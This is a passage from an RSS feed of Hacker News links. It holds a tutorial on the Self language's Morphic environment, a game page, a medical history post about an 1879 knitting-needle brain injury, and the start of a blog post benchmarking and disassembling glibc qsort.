termination. During its runtime it can interact with other objects it can reach,
and create new ones.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/processes.png" alt="Two processes: The left one is the scheduler (the root process), and the right one is a short-lived one created by the shell when I typed process this and evaluated it."> <figcaption>
            <p>Two processes: The left one
is the scheduler (the root process), and the right one is a short-lived one
created by the shell when I typed <code>process this</code> and evaluated it.</p>
        </figcaption>
</figure>

<p>Each object holds a number of slots, which can be added to and removed from
(facilitated by the programming environment). Slots can be mutable, in which
case they accept a message with their name and the new value as an argument.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/slots.png" alt="This object has a mutable slot named foo (marked by the colon on the right). I can send it a message like foo: &amp;lsquo;bar&amp;rsquo; to set the value it points at to &amp;lsquo;bar&amp;rsquo;. Constant slots (like parent above) are marked with an equals sign."> <figcaption>
            <p>This object has a mutable slot
named <code>foo</code> (marked by the colon on the right). I can send it a
message like <code>foo: ‘bar’</code> to set the value it points at to ‘bar’.
Constant slots (like <code>parent</code> above) are marked with an equals sign.</p>
        </figcaption>
</figure>

<p>Objects can also hold code when they are assigned to a slot, in which case the
slot is called a <em>method</em>, and the code will be executed when a message is sent
to that slot. Methods can take arguments, and the keywords for each argument
after the first must start with a capital letter (due to the way message
precedence works in Self).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/methods.png" alt="This object holds a method called bark, which will pop up a dialog box when it receives a message."> <figcaption>
            <p>This object holds a method
called <code>bark</code>, which will pop up a dialog box when it receives a
message.</p>
        </figcaption>
</figure>

<p>Self, unlike most object-oriented languages, is one which employs <em>prototypes</em>
for inheritance (like Javascript). Prototypes are objects which are the
canonical instance of a type. New “instances” are created by copying, or
cloning, the prototype and modifying its properties. Cloning is the only way to
create new “instances” in Self.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/cloning.png" alt="Cloning a vector. The object
on the left is the vector prototype, and the one on the right is the &amp;ldquo;instance&amp;rdquo;
that I have created by cloning the prototype, marked by the &amp;ldquo;a&amp;rdquo; before its name."> <figcaption>
            <p>Cloning a vector. The object
on the left is the vector prototype, and the one on the right is the “instance”
that I have created by cloning the prototype, marked by the “a” before its name.</p>
        </figcaption>
</figure>

<p>Now, if you know a bit about Smalltalk (and Objective-C, sort of), in the
previous picture you might have spotted that I sent a message named <code>size</code> in
order to get the size of the newly created vector. You might ask “how did the
vector know how to respond to <code>size</code>”? That’s where <em>parent slots</em> come in.
In the image, <code>parent</code> is marked with a <code>*</code>, which signifies that it is a parent
slot. When a message is to be sent to a Self object, first the regular slots of
the object is searched, and if the slot is not found there, the parent is
searched, and this operation continues recursively until it reaches an object
which doesn’t have a parent (for most Self objects, this is <code>globals</code>, which
we will talk more about later).</p>
<p>Note that parent slots can be mutable too. You can change the behavior of an
object while it exists in Self (dynamic inheritance!).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/parent_slot.png" alt="vector&amp;rsquo;s parent slot traits vector contains the defintion for the message size."> <figcaption>
            <p><code>vector</code>’s
parent slot <code>traits vector</code> contains the defintion for the message
<code>size</code>.</p>
        </figcaption>
</figure>

<p>One more thing you need to know about is <em>blocks</em>, which you might be familiar
with if you know Smalltalk or Objective-C. They are objects which hold a block
of code, and they execute the code and return the value when they are sent the
<code>value</code> message (they are just regular objects with special syntax, after all).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/blocks.png" alt="A block which reports the
number it is given."> <figcaption>
            <p>A block which reports the
number it is given.</p>
        </figcaption>
</figure>

<p>This is almost all of the Self syntax. There is not much else to talk about with
regards to the language itself, because the rest of the Self system is
constructed in the programming environment.</p>
<h2 id="the-self-programming-environment">The Self Programming Environment</h2>
<p>All of the screenshots that I showed you were from Morphic, Self’s programming
environment interface. In Self, the easiest way to interact with the system is
by using the programming environment. The user interface is built using Morphic,
which is the UI framework powering the environment, built on X11 on GNU/Linux
and Quartz on macOS.</p>
<p>When you first start the <code>morphic</code> or <code>kitchensink</code> snapshots, you are greeted
with something like this:</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/self_window.png" alt="The initial window."> <figcaption>
            <p>The initial window.</p>
        </figcaption>
</figure>

<p>From here, there are a few ways you can start using the programming environment.
First thing you should know is that there are usually two types of context menus
for each <em>morph</em> (widget or layout, in modern terms) in the workspace:</p>
<ul>
<li>The <em>object menu</em>, which contains operations related to the functionality of
the morph. This can be setting the target for a button, or adding a slot to the
object that the outliner points to. It is opened with the middle click.</li>
<li>The <em>morph menu</em>, which contains operations related to the morph itself, and
ways of modifying it. For instance, you can click <code>Resize</code> to resize the
morph. It is opened with the right click.</li>
</ul>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/menus.png" alt="The object (yellow) and morph
(blue) menus."> <figcaption>
            <p>The object (yellow) and morph
(blue) menus.</p>
        </figcaption>
</figure>

<p>If you want to do something to what the morph is showing, you middle click it.
If you want to change the morph itself, you right click it.</p>
<p>The background (called world, or root) is middle-clickable, as well, and
contains many important menu items. It is where you find the options to create a
new object, and references to some important objects in the Self environment.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/bg_menu.png" alt="The background (rootMorph) menu."> <figcaption>
            <p>The background (<code>rootMorph</code>) menu.</p>
        </figcaption>
</figure>

<h2 id="an-example">An example</h2>
<p>Let’s build the standard FizzBuzz as an example, going through the Self
programming environment while we do so. First off, let’s create a new object and
give it a few slots. <code>parent</code> will help us access the rest of the Self
environment via its value, <code>traits oddball</code> (trait for objects that are
one-of-a-kind, singleton if you must); <code>n</code>, which will be a mutable slot holding
the current number; and <code>fizzBuzzList</code>, which is what we will store our results
in (because we don’t have a terminal to print to). To do this, I first
middle-click the world and create a new object. Then I middle-click the outliner
(which are morphs that list the slots in an object, like an inspector) for the
new object, and select “Add Slot”. This opens an editor in which I can enter the
code for this slot. I enter the slot values for <code>parent</code>, <code>fizzBuzzList</code> and
<code>n</code>.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/add_slot.png" alt="Adding a slot to the new object."> <figcaption>
            <p>Adding a slot to the new object.</p>
        </figcaption>
</figure>

<figure>
    <img src="https://sin-ack.github.io/images/tour1/slot_editor.png" alt="The editor for the new slot."> <figcaption>
            <p>The editor for the new slot.</p>
        </figcaption>
</figure>

<p>One thing to note is that we can do the association of slots with values
completely interactively. Let’s do this for the <code>fizzBuzzList</code> slot. First, I
will middle-click the world and select “Globals”, which will open the <code>globals</code>
object containing all world-reachable objects in Self (of which there are many).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/globals.png" alt="The globals object."> <figcaption>
            <p>The globals object.</p>
        </figcaption>
</figure>

<p>Then I find the object I want (<code>sequence</code> for storing a sequence of values),
which is under <code>core &gt; collections &gt; ordered</code>. The standard library is nicely
organized and it is a lot of fun to discover what is available visually.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/find_sequence.png" alt="Finding sequence in globals."> <figcaption>
            <p>Finding <code>sequence</code> in <code>globals</code>.</p>
        </figcaption>
</figure>

<p>We then fetch the object by clicking the symbol on its right, and create an
instance of it by opening the prompt and sending it the message
<code>copyRemoveAll</code> to get a sequence with no values in it.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/sequence_copy.png" alt="Copying the sequence prototype."> <figcaption>
            <p>Copying the sequence prototype.</p>
        </figcaption>
</figure>

<p>Finally, I can associate this object with the <code>fizzBuzzList</code> slot in my new
object. I click the symbol next to <code>fizzBuzzList</code>, which pulls down <code>nil</code>. I
then drag the connector from <code>nil</code> to the new <code>sequence</code> instance I just
created, and it is now set. Of course, this is much easier to do by setting the
value of <code>fizzBuzzList</code> to <code>sequence copyRemoveAll</code> during slot creation, but
this allows you to set the value of slots to objects that are not well-known
(cannot be reached from <code>globals</code>), like the instance of <code>sequence</code> we had just
created. Plus, it is super cool to navigate the standard libarary.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/drag_connector.png" alt="Dragging the connector to the sequence."> <figcaption>
            <p>Dragging the connector to the sequence.</p>
        </figcaption>
</figure>

<figure>
    <img src="https://sin-ack.github.io/images/tour1/object_with_slots.png" alt="The final version
of our object, with all the slots we need."> <figcaption>
            <p>The final version
of our object, with all the slots we need.</p>
        </figcaption>
</figure>

<p>Now let’s evaluate some code to fill up that sequence. I click the “E” icon on
the top right corner of the object to open up a <em>prompt</em>. I can then enter code
here, and either “get it” (getting the result of the last statement) or “do it”
(just execute the code without grabbing any value).</p>
<p>This is the code for FizzBuzz:</p>
<!-- prettier-ignore -->
<div><pre><code data-lang="ruby"><span>1</span> <span>to</span><span>:</span> <span>100</span> <span>Do</span><span>:</span> <span>[|</span> <span>:i</span> <span>|</span>
    <span>((</span><span>i</span> <span>%</span> <span>15</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>ifTrue</span><span>:</span> <span>[</span> <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>'FizzBuzz'</span> <span>]</span> <span>False</span><span>:</span> <span>[</span>
    <span>((</span><span>i</span> <span>%</span> <span>5</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>ifTrue</span><span>:</span> <span>[</span> <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>'Buzz'</span> <span>]</span> <span>False</span><span>:</span> <span>[</span>
    <span>((</span><span>i</span> <span>%</span> <span>3</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>ifTrue</span><span>:</span> <span>[</span> <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>'Fizz'</span> <span>]</span> <span>False</span><span>:</span> <span>[</span>
        <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>i</span>
    <span>]]].</span>
<span>].</span>
<span>fizzBuzzList</span></code></pre></div>
<p>When I execute this code, it will do the following:</p>
<ol>
<li>It will first send <code>1</code> the <code>to:Do:</code> message, creating a range loop during
which our outer block will execute.</li>
<li>In the block, we receive a parameter called <code>i</code> (denoted by the <code>:</code> before
the variable’s name). In Self, to have control flow, …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sin-ack.github.io/posts/a-tour-of-self/">https://sin-ack.github.io/posts/a-tour-of-self/</a></em></p>]]>
            </description>
            <link>https://sin-ack.github.io/posts/a-tour-of-self/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25784081</guid>
            <pubDate>Thu, 14 Jan 2021 22:55:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Wikipedia Trends]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25783926">thread link</a>) | @bbrennan
<br/>
January 14, 2021 | https://rbren.io/wikitrend/ | <a href="https://web.archive.org/web/*/https://rbren.io/wikitrend/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>
      Data is from the daily top 1000 Wikipedia pages by traffic.
    </p>
    <p>
      <code>Trending</code> articles appear frequently in the top 1000, but with significantly more views on this particular day.
    </p>
    <p>
      <code>Discovered</code> articles appear infrequently in the top 1000, but happened to emerge on this particluar day.
    </p>
    
  </div></div>]]>
            </description>
            <link>https://rbren.io/wikitrend/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783926</guid>
            <pubDate>Thu, 14 Jan 2021 22:44:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtua Racing de-make for Pico-8]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25783845">thread link</a>) | @tosh
<br/>
January 14, 2021 | https://freds72.itch.io/virtua-racing | <a href="https://web.archive.org/web/*/https://freds72.itch.io/virtua-racing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="inner_column"><div id="view_html_game_page_87196"><div><div><div><p>Virtua Racing port to <a href="https://lexaloffle.com/pico-8.php" target="_blank" rel="nofollow noopener">pico-8</a> fantasy console.</p>
<p>How to play:</p>
<ul><li>left/right: steering</li><li>O button: accelerate</li><li>X button: brake</li><li>Down: change point of view</li></ul>
<p>Features:</p>
<ul><li>All 3 tracks from SEGA Megadrive version</li><li>Iconic music&nbsp; tracks from <a href="http://evergreengames.itch.io/">@RubyRed</a> &amp; @Mavica</li><li>7 AI drivers</li><li>Arcade driving physics</li><li>High detail/low details settings (adjust from pause menu)</li></ul>
<p>3D assets are from the Megadrive edition - copyright their respective owner.<br></p>
<p>The "standalone" version requires the pico8 standalone application (for arcade cabinets or offline game stations).</p></div><h2 id="download">Download</h2><div><p>Click download now to get access to the following files:</p></div><section id="devlog"><h2>Development log</h2><ul><li><a href="https://freds72.itch.io/virtua-racing/devlog/119099/squeezing-pico-8-cpu">Squeezing PICO-8 CPU!</a><p><abbr title="12 January 2020 @ 20:49"><span></span> Jan 12, 2020</abbr></p></li><li><a href="https://freds72.itch.io/virtua-racing/devlog/100269/from-bytes-to-3d">From bytes to 3d</a><p><abbr title="16 September 2019 @ 21:14"><span></span> Sep 16, 2019</abbr></p></li></ul></section></div></div></div></div></div></div>]]>
            </description>
            <link>https://freds72.itch.io/virtua-racing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783845</guid>
            <pubDate>Thu, 14 Jan 2021 22:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Caution: “larking in the servants' hall” led to a knitting needle in the brain]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25783715">thread link</a>) | @vo2maxer
<br/>
January 14, 2021 | http://www.thomas-morris.uk/a-cautionary-tale/ | <a href="https://web.archive.org/web/*/http://www.thomas-morris.uk/a-cautionary-tale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4133">
	
	<!-- .entry-header -->


	<div>
				<p>This case was reported in the <em>Saint Bartholomew’s Hospital Reports </em>– the in-house journal published by the London hospital of the same name – in 1879. The author of this article, William Steavenson, was a 29-year-old house physician at Barts (as those familiar with the hospital call it). Steavenson’s interests included chronic asthma – from which he had suffered since childhood – and the uses of electricity in medicine, about which he wrote a textbook which was published on both sides of the Atlantic. He died at the tragically early age of 41 – killed by influenza, a vulnerable person during another terrible pandemic.</p>
<p><a href="http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia.jpg"><img loading="lazy" src="http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia.jpg" alt="unusual cause of hemiplegia" width="483" height="131" srcset="http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia.jpg 774w, http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia-300x81.jpg 300w, http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia-768x208.jpg 768w" sizes="(max-width: 483px) 100vw, 483px"></a></p>
<p><em>J.D., aged 21, a gentleman’s groom, was admitted into St. Bartholomew’s Hospital on April 23, 1879, recovering from right hemiplegia.</em></p>
<p>Hemiplegia is a form of paralysis affecting one side of the body. It is most often caused by injury to the brain or (sometimes) spine.</p>
<p><em>About sixteen months before, at his master’s residence in the country, when larking in the servants’ hall, he attempted to kiss the kitchen-maid.</em></p>
<p>An act that would not be described as ‘larking’ by many employers today. The question of whether the maid had the slightest interest in being kissed by the groom is not addressed.</p>
<p><em>This young person had been engaged in knitting, and had one of the knitting-needles placed behind her left ear.</em></p>
<p>Can you guess what happened next?</p>
<p><em>As the face of the groom approached that of the young woman, the knitting-needle entered his left orbit, passing between the bone and the eyeball, to the depth, it is said, of four inches, no doubt entering the brain.</em></p>
<p>Or around 10 cm. Quite a long way into the brain, in all likelihood.</p>
<p><em>It must be supposed that the ardour of the young man was extreme, and that most likely the needle obtained a&nbsp;</em>point&nbsp;d’appui<em>&nbsp;</em><em>in the lady’s back hair</em>…</p>
<p>A <em>point d’appui </em>(literally, ‘fulcrum’) is a military term meaning a base or strong point.</p>
<p><em>…but such was the confusion following the occurrence that the history on these points is not very clear; but this much is certain, that J. D. retired from the encounter with the knitting-needle protruding from his orbit.</em></p>
<p>A vignette of extreme horror or high slapstick, depending on your point of view.</p>
<p><em>He says he removed it with his own hand.</em></p>
<p>Not, in general, a good idea. If in doubt, leave a foreign object in place and let a doctor take it out for you.</p>
<p><em>It was followed by some bleeding, and he then fainted. </em></p>
<p>Understandably.</p>
<p><em>We therefore have no accurate knowledge of the exact direction of the implement, but, from the symptoms which followed, it is very probable that it passed through the sphenoidal fissure, and must ultimately have injured the brain somewhere in the neighbourhood of the third left frontal convolution, or what is called Broca’s convolution</em>.</p>
<p>The sphenoidal or superior orbital fissure is a gap between two bones at the back of the eye socket. More interesting, however, is the reference to ‘Broca’s convolution’ (known today as <a href="https://en.wikipedia.org/wiki/Broca%27s_area">Broca’s area</a>), a region of the left frontal lobe of the brain.</p>
<p>In the 1860s a physician in France, <a href="https://en.wikipedia.org/wiki/Paul_Broca">Pierre Paul Broca</a>, encountered several patients with aphasia (inability to speak) who all turned out to have lesions in the same region of the brain. This was the first convincing evidence for the localisation of brain function – the idea that particular areas of the brain perform specialised tasks. Experimental work over the following decades established that other parts of the brain were associated with other functions such as locomotion and sensory abilities.</p>
<p>In the hospital post-mortem room, Dr Steavenson performed experiments on several cadavers, passing knitting needles through their eye sockets to find out which parts of the brain might be injured, and found that it was quite feasible for a needle to reach Broca’s area. Half a century later the Edinburgh surgeon David Greig <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5305753/?page=23">performed a similar experiment</a> (using a skull rather than a complete cadaver) and X-rayed the results, demonstrating the range of angles at which a knitting needle might enter the brain via this route:</p>
<figure id="attachment_4135" aria-describedby="caption-attachment-4135"><a href="http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle.jpg"><img loading="lazy" src="http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle.jpg" alt="x-ray of skull with needles" width="720" height="536" srcset="http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle.jpg 720w, http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle-300x223.jpg 300w" sizes="(max-width: 720px) 100vw, 720px"></a><figcaption id="caption-attachment-4135">X-ray of skull (1924) showing range of possible angles taken by knitting needle through the orbit</figcaption></figure>
<p>As for Dr Steavenson’s patient:</p>
<p><em>The injury at the time caused the patient intense pain, but did not injure his sight. Up to the fifth day after the accident he could talk and use his right arm and leg. Then he lost all power over his right upper extremity, side, and leg. The lower part of the right side of his face was paralysed, and he could not whistle. The right side of the tongue was also paralysed. The paralysis came on at night. At first the paralysed parts felt cold and dead, but he did not lose sensation. He lost the power of speech for two months.</em></p>
<p>The symptom observed by Broca in his patients, known clinically as aphasia.</p>
<p><em>On his admission to the Salop Infirmary at Shrewsbury a short time after the accident, he could only say the words “Yes, yes,” which he answered to every question.</em></p>
<p>Broca’s first patient could only utter the syllable ‘tan’, and would respond to any question with the phrase ‘tan, tan’.</p>
<p><em>The almost total paralysis remained as long as the aphasia, viz., for two months. He never lost power over his sphincters. He is now gradually recovering power over all the paralysed parts. Occasionally he has severe aching in the back of his head and on the left side of his neck, which lasts for some hours. His memory is good. He has had three epileptiform fits since the accident, one in December 1878, one in February of this year, and one in April a few days before admission.</em></p>
<p>The patient was, it seems, somewhat improved by the time he was transferred to Bart’s.</p>
<p><em>On admission, he had the appearance of being a strong, robust man in perfect health, with a florid complexion. He complained of inability to use his right hand or fingers, with weakness and only partial power over his right side, arm, and lower extremity…He remained under observation about five weeks, with galvanism applied to his arm and hand…</em></p>
<p>Galvanism is the medical use of electricity, often used at this date to treat paralysis. Since it had long been known that muscle fibres contracted when a current was passed through them, it seemed logical to apply electricity in this way. Dr Steavenson was an acknowledged authority on the subject, appointed the first head of the Barts <a href="http://www.calmhosting01.com/BartsHealth/CalmView/Record.aspx?src=CalmView.Catalog&amp;id=SBHB%2FEC">Electrical Department</a> on its foundation in 1882.</p>
<p><em>…the hand placed in the intervals upon a splint to try and bring the fingers straight, but very little improvement was observed in his condition from the time when he entered the Hospital. The contraction and rigidity of the flexors of the forearm were of too old standing to expect much improvement. He had no fits while under treatment</em></p>
<p>The human brain is a remarkable thing, but its ability to heal after physical injury is limited. There was nothing the doctors could do for this patient beyond careful rehabilitation, but he still seems to have recovered most of the function he lost in the immediate aftermath of the accident. The fact that he even survived four inches of knitting needle inside his skull is pretty extraordinary.</p>

	</div><!-- .entry-content -->
	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>http://www.thomas-morris.uk/a-cautionary-tale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783715</guid>
            <pubDate>Thu, 14 Jan 2021 22:30:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beating Up on Qsort (2019)]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25783617">thread link</a>) | @tjalfi
<br/>
January 14, 2021 | https://travisdowns.github.io/blog/2019/05/22/sorting.html | <a href="https://web.archive.org/web/*/https://travisdowns.github.io/blog/2019/05/22/sorting.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Recently, Daniel Lemire <a href="https://lemire.me/blog/2019/05/07/almost-picking-n-distinct-numbers-at-random/">tackled the topic</a> of selecting N <em>distinct</em> numbers at random. In the case we want sorted output, an obvious solution presents itself: sorting randomly chosen values and de-duplicating the list, which is easy since identical values are now adjacent.<sup id="fnref:distinct" role="doc-noteref"><a href="#fn:distinct">1</a></sup></p>

<p>While Daniel suggests a clever method of avoiding a sort entirely<sup id="fnref:danmethod" role="doc-noteref"><a href="#fn:danmethod">2</a></sup>, I’m also interested in they <em>why</em> for the underlying performace of the sort method: it takes more than 100 ns per element, which means 100s of CPU clock cycles and usually even more instructions than that (on a superscalar processor)! As a sanity check, a quick benchmark (<code>perf record ./bench &amp;&amp; perf report</code>) shows that more than 90% of the time spent in this approach is in the sorting routine, <a href="https://devdocs.io/c/algorithm/qsort">qsort</a> - so we are right to focus on this step, rather than say the de-duplication step or the initial random number generation. This naturally, this raises the question: how fast is qsort when it comes to sorting integers and can we do better?</p>

<p>All of the code for this post <a href="https://github.com/travisdowns/sort-bench">is available on GitHub</a>, so if you’d like to follow along with the code open in an editor, go right ahead (warning: there are obviously some spoilers if you dig through the code first).</p>

<h2 id="benchmarking-qsort">Benchmarking Qsort</h2>

<p>First, let’s take a look at what <code>qsort</code> is doing, to see if there is any delicous low-hanging performance fruit. We use <code>perf record ./bench qsort</code> to capture profiling data, and <code>perf report --stdio</code> to print a summary<sup id="fnref:long-tail" role="doc-noteref"><a href="#fn:long-tail">3</a></sup>:</p>

<div><div><pre><code># Samples: 101K of event 'cycles:ppp'
# Event count (approx.): 65312285835
#
# Overhead  Command  Shared Object      Symbol
# ........  .......  .................  ..............................................
#
    64.90%  bench    libc-2.23.so       [.] msort_with_tmp.part.0
    21.45%  bench    bench              [.] compare_uint64_t
     8.65%  bench    libc-2.23.so       [.] __memcpy_sse2
     0.87%  bench    libc-2.23.so       [.] __memcpy_avx_unaligned
     0.83%  bench    bench              [.] main
     0.41%  bench    [kernel.kallsyms]  [k] clear_page_erms
     0.34%  bench    [kernel.kallsyms]  [k] native_irq_return_iret
     0.31%  bench    bench              [.] bench_one
</code></pre></div></div>

<p>The assembly for the biggest offender, <code>msort_with_tmp</code> looks like this<sup id="fnref:annotate-command" role="doc-noteref"><a href="#fn:annotate-command">4</a></sup> :</p>

<div><div><pre><code> Percent | Address      | Disassembly
--------------------------------------------------
   30.55 :   39200:       mov    rax,QWORD PTR [r15]
    0.61 :   39203:       sub    rbp,0x1
    0.52 :   39207:       add    r15,0x8
    7.30 :   3920b:       mov    QWORD PTR [rbx],rax
    0.39 :   3920e:       add    rbx,0x8
    0.07 :   39212:       test   r12,r12
    0.09 :   39215:       je     390e0   ; merge finished
    1.11 :   3921b:       test   rbp,rbp
    0.01 :   3921e:       je     390e0   ; merge finished
    5.24 :   39224:       mov    rdx,QWORD PTR [rsp+0x8]
    0.42 :   39229:       mov    rsi,r15
    0.19 :   3922c:       mov    rdi,r13
    6.08 :   3922f:       call   r14
    0.59 :   39232:       test   eax,eax
    3.52 :   39234:       jg     39200
   32.69 :   39236:       mov    rax,QWORD PTR [r13+0x0]
    1.31 :   3923a:       sub    r12,0x1
    1.01 :   3923e:       add    r13,0x8
    1.09 :   39242:       jmp    3920b &lt;bsearch@@GLIBC_2.2.5+0x205b&gt;
</code></pre></div></div>

<p>Depending on your level of assembly reading skill, it may not be obvious, but this is basically a classic merge routine: it is merging two lists by comparing the top elements of each list (pointed to by <code>r13</code> and <code>r15</code>), and then storing the smaller element (the line <code>QWORD PTR [rbx],rax</code>) and loading the next element from that list. There are also two checks for termination (<code>test   r12,r12</code> and <code>test   rbp,rbp</code>). This hot loop corresponds directly to this code from <code>glibc</code> (from the file<code>msort.c</code><sup id="fnref:msort-note" role="doc-noteref"><a href="#fn:msort-note">5</a></sup>) :</p>

<div><div><pre><code><span>while</span> <span>(</span><span>n1</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>n2</span> <span>&gt;</span> <span>0</span><span>)</span>
<span>{</span>
    <span>if</span> <span>((</span><span>*</span><span>cmp</span><span>)</span> <span>(</span><span>b1</span><span>,</span> <span>b2</span><span>,</span> <span>arg</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
    <span>{</span>
        <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>tmp</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>b1</span><span>;</span>
        <span>b1</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n1</span><span>;</span>
    <span>}</span>
    <span>else</span>
    <span>{</span>
        <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>tmp</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>b2</span><span>;</span>
        <span>b2</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n2</span><span>;</span>
    <span>}</span>
    <span>tmp</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This loop suffers heavily from branch mispredictions, since the “which element is larger” branch is highly unpredictable (at least for random-looking input data). Indeed, we see roughly 128 million mispredicts while sorting ~11 million elements: close to 12 mispredicts per element.</p>

<p>We also note the presence of the indirect call at the <code>call r14</code> line. This corresponds to the <code>(*cmp) (b1, b2, arg)</code> expression in the source: it is calling the user provided comparator function through a function pointer. Since the <code>qsort()</code> code is compiled ahead of time and is found inside the shared libc binary, there is no chance that the comparator, passed as a function pointer, can be inlined.</p>

<p>The comparator function I provide looks like:</p>

<div><div><pre><code><span>int</span> <span>compare_uint64_t</span><span>(</span><span>const</span> <span>void</span> <span>*</span><span>l_</span><span>,</span> <span>const</span> <span>void</span> <span>*</span><span>r_</span><span>)</span> <span>{</span>
    <span>uint64_t</span> <span>l</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>l_</span><span>;</span>
    <span>uint64_t</span> <span>r</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>r_</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&lt;</span> <span>r</span><span>)</span> <span>return</span> <span>-</span><span>1</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&gt;</span> <span>r</span><span>)</span> <span>return</span>  <span>1</span><span>;</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>which on gcc compiles to branch-free code:</p>

<div><div><pre><code>mov    rax,QWORD PTR [rsi]
mov    edx,0xffffffff
cmp    QWORD PTR [rdi],rax
seta   al
movzx  eax,al
cmovb  eax,edx
ret
</code></pre></div></div>

<p>Note that the comparator has to redundantly load from memory the two locations to compare, something the merge loop already did (the merge loop reads them because it is responsible for moving the elements).</p>

<p>How much better could things get if we inline the comparator into the merge loop? That’s what we do in <code>qsort-inlined</code><sup id="fnref:inline-hard" role="doc-noteref"><a href="#fn:inline-hard">6</a></sup>, and here’s the main loop which now includes the comparator function<sup id="fnref:cmdline1" role="doc-noteref"><a href="#fn:cmdline1">7</a></sup> :</p>

<pre><code> 0.07 :   401dc8:       test   rbp,rbp
 0.66 :   401dcb:       je     401e0c &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0xbc&gt;
 3.51 :   401dcd:       mov    rax,QWORD PTR [r9]
 5.00 :   401dd0:       lea    rdx,[rbx+0x8]
 1.62 :   401dd4:       mov    rcx,QWORD PTR [rbx]
 0.24 :   401dd7:       lea    r8,[r9+0x8]
 6.96 :   401ddb:       cmp    rax,rcx
20.83 :   401dde:       cmovbe r9,r8
 8.88 :   401de2:       cmova  rbx,rdx
 0.27 :   401de6:       cmp    rcx,rax
 6.23 :   401de9:       sbb    r8,r8
 0.74 :   401dec:       cmp    rcx,rax
 4.93 :   401def:       sbb    rdx,rdx
 0.24 :   401df2:       not    r8
 6.69 :   401df5:       add    rbp,rdx
 0.44 :   401df8:       cmp    rax,rcx
 5.34 :   401dfb:       cmova  rax,rcx
 5.96 :   401dff:       add    rdi,0x8
 7.48 :   401e03:       mov    QWORD PTR [rdi-0x8],rax
 0.00 :   401e07:       add    r15,r8
 0.71 :   401e0a:       jne    401dc8 &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0x78&gt;
</code></pre>

